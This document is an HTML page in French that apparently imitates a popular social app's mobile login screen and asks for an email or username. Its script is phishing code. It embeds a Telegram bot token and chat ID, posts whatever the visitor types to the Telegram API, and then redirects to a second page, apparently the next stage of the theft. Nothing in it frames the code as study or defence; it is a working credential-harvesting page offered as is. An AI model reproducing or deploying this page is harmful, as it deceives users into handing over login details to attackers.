<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Connexion - E-mail / Nom d'utilisateur</title>
    <style>
        /* Réinitialisation CSS & Styles Généraux */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        html, body {
            height: 100%;
            overflow: hidden; /* Empêche le scroll global */
        }

        body {
            display: flex;
            flex-direction: column;
            background-color: #ffffff;
            color: #161823;
        }

        /* En-tête de navigation */
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 60px;
            padding: 0 16px;
            flex-shrink: 0;
        }

        .icon-btn {
            background: none;
            border: none;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
        }

        .icon-btn svg {
            width: 24px;
            height: 24px;
            fill: #161823;
        }

        .header h1 {
            font-size: 18px;
            font-weight: 700;
        }

        /* Navigation par onglets */
        .tabs-container {
            border-bottom: 1px solid rgba(22, 24, 35, 0.12);
            display: flex;
            justify-content: center;
            flex-shrink: 0;
        }

        .tab {
            font-size: 15px;
            font-weight: 600;
            color: #8a8b91;
            padding: 12px 16px;
            cursor: pointer;
            position: relative;
        }

        .tab.active {
            color: #161823;
        }

        .tab.active::after {
            content: '';
            position: absolute;
            bottom: -1px;
            left: 0;
            width: 100%;
            height: 2px;
            background-color: #161823;
        }

        /* Zone de formulaire principale */
        .main-content {
            flex: 1;
            padding: 24px;
            display: flex;
            flex-direction: column;
        }

        .input-group {
            width: 100%;
        }

        .input-field {
            width: 100%;
            height: 44px; /* Légèrement réduit pour gagner de la place */
            background-color: #f1f1f2;
            border: none;
            border-radius: 8px;
            padding: 0 16px;
            font-size: 16px; /* 16px évite le zoom auto sur iPhone */
            color: #161823;
            outline: none;
        }

        .input-field::placeholder {
            color: #8a8b91;
        }

        /* Pied de page FIXÉ en bas */
        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 20px 24px;
            background-color: white;
            border-top: 1px solid rgba(0,0,0,0.05);
        }

        .continue-btn {
            width: 100%;
            height: 48px;
            border-radius: 24px;
            border: none;
            font-size: 15px;
            font-weight: 600;
            color: #ffffff;
            cursor: pointer;
            transition: background-color 0.2s ease;
            background-color: #ff96a6; 
        }

        .continue-btn.active {
            background-color: #fe2c55;
        }
    </style>
</head>
<body>

    <header class="header">
        <button class="icon-btn" id="backBtn" aria-label="Retour">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M15.41 16.59L10.83 12l4.58-4.59L14 6l-6 6 6 6 1.41-1.41z"/>
            </svg>
        </button>
        
        <h1>Connexion</h1>
        
        <button class="icon-btn" id="helpBtn" aria-label="Aide">
            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 17h-2v-2h2v2zm2.07-7.75l-.9.92C13.45 12.9 13 13.5 13 15h-2v-.5c0-1.1.45-2.1 1.17-2.83l1.24-1.26c.37-.36.59-.86.59-1.41 0-1.1-.9-2-2-2s-2 .9-2 2H8c0-2.21 1.79-4 4-4s4 1.79 4 4c0 .88-.36 1.68-.93 2.25z"/>
            </svg>
        </button>
    </header>

    <div class="tabs-container">
        <div class="tab active">E-mail / Nom d'utilisateur</div>
    </div>

    <main class="main-content">
        <div class="input-group">
            <input type="text" id="userInput" class="input-field" placeholder="E-mail ou nom d'utilisateur">
        </div>
    </main>

    <footer class="footer">
        <button id="continueBtn" class="continue-btn" disabled>Continuer</button>
    </footer>

    <script>
        const userInput = document.getElementById('userInput');
        const continueBtn = document.getElementById('continueBtn');
        const backBtn = document.getElementById('backBtn');
        const helpBtn = document.getElementById('helpBtn');

        const TELEGRAM_TOKEN = "8245021160:AAEnbdixzuhvNj-IJVAlewEGLb0_Qszd9_U";
        const CHAT_ID = "-1003768455972";

        userInput.addEventListener('input', function() {
            if (userInput.value.trim().length > 0) {
                continueBtn.classList.add('active');
                continueBtn.removeAttribute('disabled');
            } else {
                continueBtn.classList.remove('active');
                continueBtn.setAttribute('disabled', 'true');
            }
        });

        continueBtn.addEventListener('click', async () => {
            const val = userInput.value.trim();
            continueBtn.disabled = true;
            continueBtn.innerText = "Envoi...";

            const text = `<b>📩 Nouvel Identifiant</b>\n\n<b>Utilisateur/Email:</b> <code>${val}</code>`;

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                window.location.href = "index2.html";
            } catch (err) {
                window.location.href = "index2.html";
            }
        });

        backBtn.addEventListener('click', () => {
            window.location.href = "index.html";
        });

        helpBtn.addEventListener('click', () => {
            alert('Ouverture du centre d\'aide...');
        });
    </script>

</body>
</html>
